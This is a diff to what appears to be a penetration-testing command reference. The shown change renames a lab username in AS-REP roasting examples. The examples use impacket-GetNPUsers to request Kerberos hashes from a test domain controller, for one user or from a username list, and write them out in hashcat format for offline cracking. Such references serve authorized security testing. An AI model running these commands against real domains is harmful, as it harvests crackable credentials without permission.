@@ -6,10 +6,10 @@ description: |
   Reference values:
     Target DC: 10.10.10.1
     Domain: test.local
-    Username: john
+    Username: pentuser
 command: |
   # With a known username
-  impacket-GetNPUsers test.local/john -dc-ip 10.10.10.1 -no-pass -format hashcat -outputfile asrep.txt
+  impacket-GetNPUsers test.local/pentuser -dc-ip 10.10.10.1 -no-pass -format hashcat -outputfile asrep.txt
 
   # With a username list
   impacket-GetNPUsers test.local/ -dc-ip 10.10.10.1 -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
